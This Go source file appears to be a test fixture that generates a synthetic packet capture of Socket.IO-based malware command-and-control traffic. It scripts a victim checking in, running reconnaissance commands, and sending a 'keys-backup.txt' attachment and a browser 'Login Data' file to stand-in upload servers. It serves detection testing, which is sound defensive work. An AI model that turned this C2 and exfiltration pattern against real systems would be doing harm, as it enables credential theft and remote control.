package fixture

import (
	"fmt"
	"io"
	"net/netip"
	"strings"
	"time"
)

// Scenario parameters for the synthetic C2 capture.
type Scenario struct {
	Victim   netip.Addr
	C2       netip.AddrPort
	Upload   netip.AddrPort // collection module upload server
	SID      string
	UID      string
	Start    time.Time
	Commands []string
}

// DefaultScenario is what `crumble fixture pcap` writes.
func DefaultScenario() Scenario {
	return Scenario{
		Victim:   netip.MustParseAddr("198.51.100.7"),
		C2:       netip.MustParseAddrPort("203.0.113.47:1418"),
		Upload:   netip.MustParseAddrPort("198.51.100.88:1224"),
		SID:      "Gq8vRk2LmZ0aT1xXAAAB",
		UID:      "c7f2a1e09b",
		Start:    time.Date(2026, 3, 14, 9, 12, 3, 0, time.UTC),
		Commands: []string{"whoami", `dir %USERPROFILE%\Documents`, "tasklist /v"},
	}
}

// fake command output, so the transcript has something realistic to show
// and the long one crosses the permessage-deflate threshold.
func output(cmd string) string {
	switch {
	case cmd == "whoami":
		return "desktop-4f2k9qa\\j.doe\r\n"
	case strings.HasPrefix(cmd, "dir"):
		var b strings.Builder
		b.WriteString(" Volume in drive C has no label.\r\n Directory of C:\\Users\\j.doe\\Documents\r\n\r\n")
		names := []string{"interview-task", "resume_final.pdf", "keys-backup.txt", "projects", "contracts",
			"invoice_0193.pdf", "invoice_0194.pdf", "wallet-recovery.txt", "notes.md", "dev-env.ps1",
			"meeting-2026-03-11.docx", "budget.xlsx", "ssh-config.txt", "id_ed25519.pub", "screenshot1.png"}
		for i, n := range names {
			fmt.Fprintf(&b, "03/%02d/2026  10:%02d AM    %10d %s\r\n", 1+i%13, 10+i*3, 1024*(i+3)*(i+7), n)
		}
		b.WriteString(fmt.Sprintf("              %d File(s)      1,337,421 bytes\r\n", len(names)))
		return b.String()
	default:
		return "Image Name                     PID Session Name        Session#    Mem Usage\r\nnode.exe                      6120 Console                    1     48,212 K\r\n"
	}
}

// Write builds the capture: Engine.IO v4 polling handshake, Socket.IO
// CONNECT, upgrade to WebSocket with permessage-deflate, registration,
// three rounds of tasking, a binary event, and a separate multipart upload
// to the collection server.
func Write(out io.Writer, sc Scenario, f Format) error {
	w := NewWriter(sc.Start)
	host := sc.C2.String()
	ua := []string{"Accept: */*", "Connection: keep-alive"}
	t := func(n int) string { return fmt.Sprintf("Px%04dq", n) } // cache-buster, as engine.io-client adds

	// 1. polling handshake + CONNECT on the default namespace
	c1 := w.Dial(netip.AddrPortFrom(sc.Victim, 51544), sc.C2, 0x1c2d3e4f)
	c1.Send(true, httpReq("GET", "/socket.io/?EIO=4&transport=polling&t="+t(1), host, ua, ""))
	open := fmt.Sprintf(`0{"sid":"%s","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":20000,"maxPayload":1000000}`, sc.SID)
	c1.Send(false, httpResp("200 OK", []string{"Content-Type: text/plain; charset=UTF-8", "Access-Control-Allow-Origin: *"}, open))
	c1.Send(true, httpReq("POST", "/socket.io/?EIO=4&transport=polling&t="+t(2)+"&sid="+sc.SID, host,
		append(ua, "Content-Type: text/plain;charset=UTF-8"), "40"))
	c1.Send(false, httpResp("200 OK", []string{"Content-Type: text/html"}, "ok"))
	c1.Send(true, httpReq("GET", "/socket.io/?EIO=4&transport=polling&t="+t(3)+"&sid="+sc.SID, host, ua, ""))
	c1.Send(false, httpResp("200 OK", []string{"Content-Type: text/plain; charset=UTF-8"}, `40{"sid":"Hn3cE0q9_l2oQf7iAAAC"}`))

	// 2. WebSocket upgrade on the same sid
	c2 := w.Dial(netip.AddrPortFrom(sc.Victim, 51545), sc.C2, 0x7f00a1b2)
	c2.Send(true, httpReq("GET", "/socket.io/?EIO=4&transport=websocket&sid="+sc.SID, host, []string{
		"Connection: Upgrade", "Upgrade: websocket", "Sec-WebSocket-Version: 13",
		"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==",
		"Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits",
	}, ""))
	c2.Send(false, httpResp("101 Switching Protocols", []string{
		"Upgrade: websocket", "Connection: Upgrade",
		"Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=",
		"Sec-WebSocket-Extensions: permessage-deflate; client_no_context_takeover; server_no_context_takeover",
	}, ""))

	key := [4]byte{0x37, 0xfa, 0x21, 0x3d}
	up := func(s string) { c2.Send(true, wsFrame(0x1, []byte(s), true, false, key)) }
	upZ := func(s string) { c2.Send(true, wsFrame(0x1, deflateMessage([]byte(s)), true, true, key)) }
	down := func(s string) { c2.Send(false, wsFrame(0x1, []byte(s), false, false, key)) }

	up("2probe")
	down("3probe")
	up("5")
	w.tick(120 * time.Millisecond)
	up(fmt.Sprintf(`42["identify",{"uid":"%s","t":"5","hostname":"DESKTOP-4F2K9QA","platform":"win32","user":"j.doe"}]`, sc.UID))

	for i, cmd := range sc.Commands {
		w.tick(time.Duration(9+i*4) * time.Second)
		down(fmt.Sprintf(`42["command",{"message":%q}]`, cmd))
		w.tick(380 * time.Millisecond)
		msg := fmt.Sprintf(`42["message",{"uid":%q,"command":%q,"result":%q}]`, sc.UID, cmd, output(cmd))
		if len(msg) > 1024 {
			upZ(msg) // ws only compresses above its 1 KiB threshold
		} else {
			up(msg)
		}
		if i == 0 {
			w.tick(25 * time.Second)
			down("2")
			up("3")
		}
	}

	// A BINARY_EVENT with one attachment, to exercise placeholder handling.
	w.tick(4 * time.Second)
	up(`451-["file",{"name":"keys-backup.txt","data":{"_placeholder":true,"num":0}}]`)
	c2.Send(true, wsFrame(0x2, []byte("synthetic attachment: this is not a real key\n"), true, false, key))
	c2.Close()

	// 3. collection module: multipart upload to a different host and port
	c3 := w.Dial(netip.AddrPortFrom(sc.Victim, 51561), sc.Upload, 0x0badf00d)
	boundary := "----formdata-crumble-7d1c"
	body := strings.Join([]string{
		"--" + boundary,
		`Content-Disposition: form-data; name="hid"`, "", "DESKTOP-4F2K9QA",
		"--" + boundary,
		`Content-Disposition: form-data; name="file"; filename="Login Data"`,
		"Content-Type: application/octet-stream", "", "SQLite format 3 (synthetic)",
		"--" + boundary + "--", "",
	}, "\r\n")
	c3.Send(true, httpReq("POST", "/uploads", sc.Upload.String(), []string{
		"Accept: application/json, text/plain, */*",
		"Content-Type: multipart/form-data; boundary=" + boundary,
		"User-Agent: axios/1.7.7",
	}, body))
	c3.Send(false, httpResp("200 OK", []string{"Content-Type: application/json; charset=utf-8", "X-Powered-By: Express"}, `{"ok":true}`))
	c3.Close()

	return w.WriteTo(out, f)
}
